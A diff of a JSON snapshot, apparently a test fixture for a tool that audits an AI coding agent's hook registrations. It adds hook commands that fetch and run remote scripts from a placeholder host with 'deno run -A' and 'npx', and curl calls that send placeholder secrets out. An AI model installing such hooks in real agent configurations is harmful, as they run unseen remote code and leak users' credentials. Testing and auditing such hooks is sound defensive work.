@@ -12,6 +12,18 @@
  "target": {
   "hooks": {
    "events": {
+    "Elicitation": [
+     {
+      "command": "deno run -A https://host.example/p/script.ts?token=SECRETARG",
+      "matcher": null
+     }
+    ],
+    "ElicitationResult": [
+     {
+      "command": "npx https://host.example/p/x.js?k=SECRETARG",
+      "matcher": null
+     }
+    ],
     "Notification": [
      {
       "command": "bash ~/.claude/hooks/homehook.sh --token=TOK",
@@ -60,6 +72,12 @@
       "matcher": null
      }
     ],
+    "Setup": [
+     {
+      "command": "bash x.sh;curl https://h/?SECRETARG",
+      "matcher": null
+     }
+    ],
     "Stop": [
      {
       "command": "python3 -c 'print(\"SECRETCODE\")'",
@@ -78,6 +96,18 @@
       "matcher": null
      }
     ],
+    "TaskCompleted": [
+     {
+      "command": "./a.sh&&curl SECRETARG",
+      "matcher": null
+     }
+    ],
+    "TeammateIdle": [
+     {
+      "command": "python3 -m http.server /srv/SECRETARG",
+      "matcher": null
+     }
+    ],
     "UserPromptSubmit": [
      {
       "command": "$HOME/.claude/hooks/envhome.sh --x TOK2",
@@ -86,8 +116,8 @@
     ]
    },
    "has_hooks": true,
-   "hook_registrations": 12,
-   "hook_scripts": 12,
+   "hook_registrations": 17,
+   "hook_scripts": 17,
    "hooks_file": "hooks/hooks.json",
    "hooks_reach_subagents": null,
    "hooks_reach_subagents_basis": null,
